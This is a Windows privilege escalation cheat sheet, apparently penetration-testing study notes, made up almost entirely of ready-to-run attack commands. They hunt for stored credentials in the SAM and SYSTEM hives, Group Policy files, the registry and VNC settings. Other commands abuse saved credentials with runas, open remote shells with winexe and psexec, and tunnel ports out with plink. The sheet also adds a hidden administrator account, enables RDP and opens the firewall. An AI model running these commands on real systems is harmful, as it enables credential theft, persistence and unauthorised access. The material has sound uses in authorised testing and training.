# Windows Privilege Escalation Cheat Sheet

## Basic Enumeration

- **Use `dir /ah` to list hidden files**
- Check for saved credentials using `cmdkey /list`. If there are saved credentials, use check *Saved Credentials* below.
- Patch level:

```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
- Users and groups:

```
net user
net localgroup
net user /domain
net group /domain
```

- Firewall:

```
netsh firewall show state
netsh firewall show config
```

- Network environment

```
ipconfig /all
route print
arp -A
```

- Scheduled Tasks (1): `schtasks /query /fo LIST /v` --> Copy and analyze with `cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM`
- Scheduled Tasks (2): `dir %SystemRoot%\Tasks`

# Weak Service Permissions
```
accesschk.exe /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv <Service Name>
sc qc <Service Name> (Get service details)
```

Check service with weak file permission:

```
cd c:\windows\temp\
wmic.exe
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

```
sc.exe
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

## Unquoted Service Path

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """

sc query
sc qc service name
```

## AlwaysInstallElevated

*Note: for 64 bits use:* `%SystemRoot%\Sysnative\reg.exe`

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

## Saved and Stored Credentials

### Built-in Storage
- Check with `cmdkey /list`
- Exploit with `runas /savecred /user:<DOMAIN>\Administrator "c:\windows\system32\cmd.exe /c <shell commands>"`

### Common Files

#### Unattended Installation

Look for stored passwords in

```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

#### IIS Web Config

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

#### Group Policy Passwords

1. Determine domain controller with: `set l` (check the last line)
2. Get `Groups.xml`: Check `\\<Value from above>\sysvol\internal.domain\Policies\{A3FB602A-1234-4C58-CDEF-1FCC8D87BFAA}\Machine\Preferences\Groups\groups.xml`
3. Decrypt `cpassword`
4. Get `newName` value from `Groups.xml` (also displayed after step 3?)
5. Execute `runas /user:<user from step 4> cmd.exe` with determined password

Or also in:

```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```

#### Misc Files

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si pass/pwd *.ini
dir /s pass == cred == vnc == .config

findstr /spin "password" .
findstr /spin "password" .

C:\> dir /b /s unattend.xml
C:\> dir /b /s web.config
C:\> dir /b /s sysprep.inf
C:\> dir /b /s sysprep.xml
C:\> dir /b /s *pass*
C:\> dir /b /s vnc.ini

dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

#### AutoLogin

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

#### McAfee

`%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml`

#### TightVNC

`reg query "HKCU\Software\TightVNC\Server"`

#### Real VNC

`reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password`
`reg query "HKCU\Software\ORL\WinVNC3\Password"`

#### UltraVNC

Look for

```
[ultravnc]
passwd=5FAEBBD0EF0A2413
```

#### PuTTY

`reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`

#### Registry

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

#### SAM

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

#### SNMP

`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`


#### Useful PowerSploit Modules

```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```

## Port Forwarding

- `netstat -ano`
- Upload `plink.exe`
- plink.exe -R "remote port":127.0.0.1:"local port" root@"ipaddress"

# Execute Powershell Scripts From cmd.exe

```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Sherlock.ps1}"
```

# Privileges

Check privileges and look for `SeImpersonatePrivilege` --> Potato exploits

```
whoami /priv
```
For x86: compile exploits first

# Connect to Windows Host as Specific User

```
winexe -U username%password //10.11.1.73 cmd.exe
```

Or with impacket `psexec.py`:

```
./psexec.py alice:<password>@<IP> cmd.exe
```

# Add Admin User and Enable RDP

In case of an error, there is a possibility of Password Complexity set on the Remote Machine, try a complex password.
```
C:\WINDOWS\system32>net user thunder password /add && net localgroup "Remote Desktop users" thunder /add && net localgroup Administrators thunder /add

C:\WINDOWS\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\WINDOWS\system32>reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
C:\WINDOWS\system32>reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
C:\WINDOWS\system32>sc config TermService start= auto
C:\WINDOWS\system32>net start Termservice
C:\WINDOWS\system32>netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

# Weak Permissions

## Services

Use `accesschk.exe` - you need a [version](https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/) with the `/accepteula` flag (also included in this repo).
```
accesschk.exe /accepteula 
accesschk.exe -ucqv [service_name] 
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Group Name" *
accesschk.exe -ucqv [service_name]
```

## Find all weak folder permissions per drive
```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```
## Find all weak file permissions per drive
```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

## Compile Exploits for Windows

```
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```

# References

- [PrivEsc Cheatsheet](https://guif.re/windowseop)
- [PayloadsAllTheThings - Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Fuzzy Security - Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
- [Windows Priv Esc](https://github.com/xMilkPowderx/OSCP/blob/master/Windows%20Priv%20Esc.md)
- [Stored Credentials](https://pentestlab.blog/tag/privilege-escalation/page/3/)
